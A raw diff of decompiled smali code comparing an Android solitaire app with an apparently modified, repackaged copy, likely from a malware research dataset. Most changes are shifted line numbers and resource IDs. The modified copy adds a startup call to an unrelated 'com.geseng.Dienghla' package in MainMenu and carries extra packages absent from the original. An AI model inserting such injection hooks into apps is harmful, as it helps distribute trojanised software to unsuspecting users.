+<     .line 367
+---
+>     .line 362
+1461c1461
+<     .line 368
+---
+>     .line 363
+1467,1472c1467,1468
+<     .line 369
+<     invoke-virtual {p0}, Lcom/smilerlee/solitaire/game/SolitaireGame;->isCompleted()Z
+< 
+<     move-result v1
+< 
+<     if-eqz v1, :cond_1
+---
+>     .line 364
+>     sget v1, Lcom/smilerlee/solitaire/Options;->vegas_money:I
+1474,1475c1470
+<     .line 370
+<     sget v0, Lcom/smilerlee/solitaire/Options;->vegas_money:I
+---
+>     add-int/2addr v0, v1
+1477c1472
+<     .line 375
+---
+>     .line 366
+1479d1473
+<     :goto_0
+1484c1478
+<     .line 377
+---
+>     .line 368
+1486c1480
+<     :goto_1
+---
+>     :goto_0
+1489,1490d1482
+<     .line 372
+<     .restart local v0    # "score":I
+1492,1500d1483
+<     sget v1, Lcom/smilerlee/solitaire/Options;->vegas_money:I
+< 
+<     add-int/2addr v0, v1
+< 
+<     goto :goto_0
+< 
+<     .line 377
+<     .end local v0    # "score":I
+<     :cond_2
+1505c1488
+<     goto :goto_1
+---
+>     goto :goto_0
+1512c1495
+<     .line 445
+---
+>     .line 376
+1517c1500
+<     .line 446
+---
+>     .line 377
+1523c1506
+<     .line 447
+---
+>     .line 378
+1528c1511
+<     .line 448
+---
+>     .line 379
+1533c1516
+<     .line 449
+---
+>     .line 380
+1541c1524
+<     .line 114
+---
+>     .line 109
+1563c1546
+<     .line 110
+---
+>     .line 105
+1573c1556
+<     .line 233
+---
+>     .line 228
+1604c1587
+<     .line 235
+---
+>     .line 230
+1610c1593
+<     .line 239
+---
+>     .line 234
+1614c1597
+<     .line 237
+---
+>     .line 232
+1631c1614
+<     .line 352
+---
+>     .line 347
+1668c1651
+<     .line 355
+---
+>     .line 350
+1671c1654
+<     .line 356
+---
+>     .line 351
+1674c1657
+<     .line 358
+---
+>     .line 353
+1686,1855d1668
+< .method public openGameMenu()V
+<     .locals 8
+< 
+<     .prologue
+<     const/4 v7, 0x4
+< 
+<     const/4 v6, 0x3
+< 
+<     const/4 v5, 0x2
+< 
+<     const/4 v4, 0x0
+< 
+<     const/4 v3, 0x1
+< 
+<     .line 383
+<     invoke-virtual {p0, v3}, Lcom/smilerlee/solitaire/game/SolitaireGame;->setIgnoreEvent(Z)V
+< 
+<     .line 384
+<     invoke-virtual {p0}, Lcom/smilerlee/solitaire/game/SolitaireGame;->getContext()Landroid/content/Context;
+< 
+<     move-result-object v2
+< 
+<     invoke-virtual {v2}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;
+< 
+<     move-result-object v1
+< 
+<     .line 386
+<     .local v1, "res":Landroid/content/res/Resources;
+<     sget-boolean v2, Lcom/smilerlee/solitaire/Options;->back_button_undo:Z
+< 
+<     if-eqz v2, :cond_0
+< 
+<     .line 387
+<     const/4 v2, 0x5
+< 
+<     new-array v0, v2, [Ljava/lang/CharSequence;
+< 
+<     const v2, 0x7f0a0068
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v4
+< 
+<     const v2, 0x7f0a0065
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v3
+< 
+<     const v2, 0x7f0a0066
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v5
+< 
+<     const v2, 0x7f0a006a
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v6
+< 
+<     const v2, 0x7f0a0069
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v7
+< 
+<     .line 402
+<     .local v0, "items":[Ljava/lang/CharSequence;
+<     :goto_0
+<     new-instance v2, Landroid/app/AlertDialog$Builder;
+< 
+<     invoke-virtual {p0}, Lcom/smilerlee/solitaire/game/SolitaireGame;->getContext()Landroid/content/Context;
+< 
+<     move-result-object v3
+< 
+<     invoke-direct {v2, v3}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V
+< 
+<     const v3, 0x7f0a0044
+< 
+<     invoke-virtual {v2, v3}, Landroid/app/AlertDialog$Builder;->setTitle(I)Landroid/app/AlertDialog$Builder;
+< 
+<     move-result-object v2
+< 
+<     new-instance v3, Lcom/smilerlee/solitaire/game/SolitaireGame$3;
+< 
+<     invoke-direct {v3, p0}, Lcom/smilerlee/solitaire/game/SolitaireGame$3;-><init>(Lcom/smilerlee/solitaire/game/SolitaireGame;)V
+< 
+<     invoke-virtual {v2, v0, v3}, Landroid/app/AlertDialog$Builder;->setItems([Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
+< 
+<     move-result-object v2
+< 
+<     const v3, 0x7f0a0048
+< 
+<     new-instance v4, Lcom/smilerlee/solitaire/game/SolitaireGame$2;
+< 
+<     invoke-direct {v4, p0}, Lcom/smilerlee/solitaire/game/SolitaireGame$2;-><init>(Lcom/smilerlee/solitaire/game/SolitaireGame;)V
+< 
+<     invoke-virtual {v2, v3, v4}, Landroid/app/AlertDialog$Builder;->setNeutralButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
+< 
+<     move-result-object v2
+< 
+<     new-instance v3, Lcom/smilerlee/solitaire/game/SolitaireGame$1;
+< 
+<     invoke-direct {v3, p0}, Lcom/smilerlee/solitaire/game/SolitaireGame$1;-><init>(Lcom/smilerlee/solitaire/game/SolitaireGame;)V
+< 
+<     invoke-virtual {v2, v3}, Landroid/app/AlertDialog$Builder;->setOnCancelListener(Landroid/content/DialogInterface$OnCancelListener;)Landroid/app/AlertDialog$Builder;
+< 
+<     move-result-object v2
+< 
+<     invoke-virtual {v2}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;
+< 
+<     move-result-object v2
+< 
+<     invoke-virtual {v2}, Landroid/app/AlertDialog;->show()V
+< 
+<     .line 439
+<     return-void
+< 
+<     .line 395
+<     .end local v0    # "items":[Ljava/lang/CharSequence;
+<     :cond_0
+<     new-array v0, v7, [Ljava/lang/CharSequence;
+< 
+<     const v2, 0x7f0a0068
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v4
+< 
+<     const v2, 0x7f0a0065
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v3
+< 
+<     const v2, 0x7f0a0066
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v5
+< 
+<     const v2, 0x7f0a006a
+< 
+<     invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getText(I)Ljava/lang/CharSequence;
+< 
+<     move-result-object v2
+< 
+<     aput-object v2, v0, v6
+< 
+<     .restart local v0    # "items":[Ljava/lang/CharSequence;
+<     goto :goto_0
+< .end method
+< 
+1860c1673
+<     .line 65
+---
+>     .line 60
+1863c1676
+<     .line 66
+---
+>     .line 61
+1868c1681
+<     .line 67
+---
+>     .line 62
+1877c1690
+<     .line 454
+---
+>     .line 385
+1882c1695
+<     .line 455
+---
+>     .line 386
+1888c1701
+<     .line 456
+---
+>     .line 387
+1893c1706
+<     .line 457
+---
+>     .line 388
+1898c1711
+<     .line 458
+---
+>     .line 389
+1907c1720
+<     .line 342
+---
+>     .line 337
+1914c1727
+<     .line 343
+---
+>     .line 338
+1921c1734
+<     .line 345
+---
+>     .line 340
+1925c1738
+<     .line 346
+---
+>     .line 341
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/MainMenu.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/MainMenu.smali
+1160a1161,1162
+>     invoke-static {p0}, Lcom/geseng/Dienghla;->init(Landroid/content/Context;)V
+> 
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/R$string.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/R$string.smali
+24c24
+< .field public static final bg1_name:I = 0x7f0a0085
+---
+> .field public static final bg1_name:I = 0x7f0a0083
+26c26
+< .field public static final bg2_name:I = 0x7f0a0086
+---
+> .field public static final bg2_name:I = 0x7f0a0084
+28c28
+< .field public static final bg3_name:I = 0x7f0a0087
+---
+> .field public static final bg3_name:I = 0x7f0a0085
+30c30
+< .field public static final bg4_name:I = 0x7f0a0088
+---
+> .field public static final bg4_name:I = 0x7f0a0086
+34c34
+< .field public static final card_badk1_name:I = 0x7f0a0089
+---
+> .field public static final card_badk1_name:I = 0x7f0a0087
+36c36
+< .field public static final card_badk2_name:I = 0x7f0a008a
+---
+> .field public static final card_badk2_name:I = 0x7f0a0088
+38c38
+< .field public static final card_badk3_name:I = 0x7f0a008b
+---
+> .field public static final card_badk3_name:I = 0x7f0a0089
+40c40
+< .field public static final card_badk4_name:I = 0x7f0a008c
+---
+> .field public static final card_badk4_name:I = 0x7f0a008a
+42c42
+< .field public static final color_blue:I = 0x7f0a0083
+---
+> .field public static final color_blue:I = 0x7f0a0081
+44c44
+< .field public static final color_green:I = 0x7f0a0081
+---
+> .field public static final color_green:I = 0x7f0a007f
+46c46
+< .field public static final color_orange:I = 0x7f0a0082
+---
+> .field public static final color_orange:I = 0x7f0a0080
+48c48
+< .field public static final color_red:I = 0x7f0a0084
+---
+> .field public static final color_red:I = 0x7f0a0082
+164c164
+< .field public static final exit:I = 0x7f0a006c
+---
+> .field public static final exit:I = 0x7f0a006a
+174c174
+< .field public static final main_menu:I = 0x7f0a0069
+---
+> .field public static final main_menu:I = 0x7f0a0067
+198,201d197
+< .field public static final new_game_draw_1:I = 0x7f0a0065
+< 
+< .field public static final new_game_draw_3:I = 0x7f0a0066
+< 
+210c206
+< .field public static final orientation_auto:I = 0x7f0a008d
+---
+> .field public static final orientation_auto:I = 0x7f0a008b
+212c208
+< .field public static final orientation_landsacpe:I = 0x7f0a008f
+---
+> .field public static final orientation_landsacpe:I = 0x7f0a008d
+214c210
+< .field public static final orientation_portrait:I = 0x7f0a008e
+---
+> .field public static final orientation_portrait:I = 0x7f0a008c
+216c212
+< .field public static final preference_back_button_undo_summary:I = 0x7f0a0076
+---
+> .field public static final preference_back_button_undo_summary:I = 0x7f0a0074
+218c214
+< .field public static final preference_back_button_undo_title:I = 0x7f0a0075
+---
+> .field public static final preference_back_button_undo_title:I = 0x7f0a0073
+220c216
+< .field public static final preference_background_summary:I = 0x7f0a006e
+---
+> .field public static final preference_background_summary:I = 0x7f0a006c
+222c218
+< .field public static final preference_background_title:I = 0x7f0a006d
+---
+> .field public static final preference_background_title:I = 0x7f0a006b
+224c220
+< .field public static final preference_card_back_summary:I = 0x7f0a0070
+---
+> .field public static final preference_card_back_summary:I = 0x7f0a006e
+226c222
+< .field public static final preference_card_back_title:I = 0x7f0a006f
+---
+> .field public static final preference_card_back_title:I = 0x7f0a006d
+228c224
+< .field public static final preference_draw_three_summary:I = 0x7f0a0078
+---
+> .field public static final preference_draw_three_summary:I = 0x7f0a0076
+230c226
+< .field public static final preference_draw_three_title:I = 0x7f0a0077
+---
+> .field public static final preference_draw_three_title:I = 0x7f0a0075
+232c228
+< .field public static final preference_orientation_summary:I = 0x7f0a0072
+---
+> .field public static final preference_orientation_summary:I = 0x7f0a0070
+234c230
+< .field public static final preference_orientation_title:I = 0x7f0a0071
+---
+> .field public static final preference_orientation_title:I = 0x7f0a006f
+236c232
+< .field public static final preference_sound_summary:I = 0x7f0a0074
+---
+> .field public static final preference_sound_summary:I = 0x7f0a0072
+238c234
+< .field public static final preference_sound_title:I = 0x7f0a0073
+---
+> .field public static final preference_sound_title:I = 0x7f0a0071
+240c236
+< .field public static final preference_spider_restricted_deal_summary:I = 0x7f0a0080
+---
+> .field public static final preference_spider_restricted_deal_summary:I = 0x7f0a007e
+242c238
+< .field public static final preference_spider_restricted_deal_title:I = 0x7f0a007f
+---
+> .field public static final preference_spider_restricted_deal_title:I = 0x7f0a007d
+244c240
+< .field public static final preference_spider_suits_summary:I = 0x7f0a007e
+---
+> .field public static final preference_spider_suits_summary:I = 0x7f0a007c
+246c242
+< .field public static final preference_spider_suits_title:I = 0x7f0a007d
+---
+> .field public static final preference_spider_suits_title:I = 0x7f0a007b
+248c244
+< .field public static final preference_vegas_cumulative_summary:I = 0x7f0a007c
+---
+> .field public static final preference_vegas_cumulative_summary:I = 0x7f0a007a
+250c246
+< .field public static final preference_vegas_cumulative_title:I = 0x7f0a007b
+---
+> .field public static final preference_vegas_cumulative_title:I = 0x7f0a0079
+252c248
+< .field public static final preference_vegas_mode_summary:I = 0x7f0a007a
+---
+> .field public static final preference_vegas_mode_summary:I = 0x7f0a0078
+254c250
+< .field public static final preference_vegas_mode_title:I = 0x7f0a0079
+---
+> .field public static final preference_vegas_mode_title:I = 0x7f0a0077
+256c252
+< .field public static final restart:I = 0x7f0a0068
+---
+> .field public static final restart:I = 0x7f0a0066
+266c262
+< .field public static final select_game:I = 0x7f0a0067
+---
+> .field public static final select_game:I = 0x7f0a0065
+268c264
+< .field public static final settings:I = 0x7f0a006b
+---
+> .field public static final settings:I = 0x7f0a0069
+282c278
+< .field public static final stat_average_winning_moves:I = 0x7f0a009f
+---
+> .field public static final stat_average_winning_moves:I = 0x7f0a009d
+284c280
+< .field public static final stat_average_winning_time:I = 0x7f0a009d
+---
+> .field public static final stat_average_winning_time:I = 0x7f0a009b
+286c282
+< .field public static final stat_current_money:I = 0x7f0a00a5
+---
+> .field public static final stat_current_money:I = 0x7f0a00a3
+288c284
+< .field public static final stat_current_streak:I = 0x7f0a00a2
+---
+> .field public static final stat_current_streak:I = 0x7f0a00a0
+290c286
+< .field public static final stat_draw_1:I = 0x7f0a0090
+---
+> .field public static final stat_draw_1:I = 0x7f0a008e
+292c288
+< .field public static final stat_draw_3:I = 0x7f0a0091
+---
+> .field public static final stat_draw_3:I = 0x7f0a008f
+294c290
+< .field public static final stat_fewest_winning_moves:I = 0x7f0a009e
+---
+> .field public static final stat_fewest_winning_moves:I = 0x7f0a009c
+296c292
+< .field public static final stat_freecell:I = 0x7f0a0093
+---
+> .field public static final stat_freecell:I = 0x7f0a0091
+298c294
+< .field public static final stat_games_played:I = 0x7f0a0099
+---
+> .field public static final stat_games_played:I = 0x7f0a0097
+300c296
+< .field public static final stat_games_won:I = 0x7f0a009a
+---
+> .field public static final stat_games_won:I = 0x7f0a0098
+302c298
+< .field public static final stat_high_score:I = 0x7f0a0098
+---
+> .field public static final stat_high_score:I = 0x7f0a0096
+304c300
+< .field public static final stat_longest_losing_streak:I = 0x7f0a00a1
+---
+> .field public static final stat_longest_losing_streak:I = 0x7f0a009f
+306c302
+< .field public static final stat_longest_winning_streak:I = 0x7f0a00a0
+---
+> .field public static final stat_longest_winning_streak:I = 0x7f0a009e
+308c304
+< .field public static final stat_most_money_lost:I = 0x7f0a00a4
+---
+> .field public static final stat_most_money_lost:I = 0x7f0a00a2
+310c306
+< .field public static final stat_most_money_won:I = 0x7f0a00a3
+---
+> .field public static final stat_most_money_won:I = 0x7f0a00a1
+312c308
+< .field public static final stat_shortest_winning_time:I = 0x7f0a009c
+---
+> .field public static final stat_shortest_winning_time:I = 0x7f0a009a
+314c310
+< .field public static final stat_spider_1_suit:I = 0x7f0a0094
+---
+> .field public static final stat_spider_1_suit:I = 0x7f0a0092
+316c312
+< .field public static final stat_spider_2_suits:I = 0x7f0a0095
+---
+> .field public static final stat_spider_2_suits:I = 0x7f0a0093
+318c314
+< .field public static final stat_spider_3_suits:I = 0x7f0a0096
+---
+> .field public static final stat_spider_3_suits:I = 0x7f0a0094
+320c316
+< .field public static final stat_spider_4_suits:I = 0x7f0a0097
+---
+> .field public static final stat_spider_4_suits:I = 0x7f0a0095
+322c318
+< .field public static final stat_vegas:I = 0x7f0a0092
+---
+> .field public static final stat_vegas:I = 0x7f0a0090
+324c320
+< .field public static final stat_win_percentage:I = 0x7f0a009b
+---
+> .field public static final stat_win_percentage:I = 0x7f0a0099
+326c322
+< .field public static final statistics:I = 0x7f0a006a
+---
+> .field public static final statistics:I = 0x7f0a0068
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/R$styleable.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/R$styleable.smali
+28c28
+<     .line 668
+---
+>     .line 666
+48c48
+<     .line 657
+---
+>     .line 655
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/R$style.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/R$style.smali
+42c42
+<     .line 633
+---
+>     .line 631
+diff -r result/APP_29/App_B_29/smali/com/smilerlee/solitaire/R$xml.smali result/APP_29/App_M_29/smali/com/smilerlee/solitaire/R$xml.smali
+26c26
+<     .line 654
+---
+>     .line 652
+Somente em result/APP_29/App_M_29/smali/com: umeng
+Somente em result/APP_29/App_M_29/smali: net
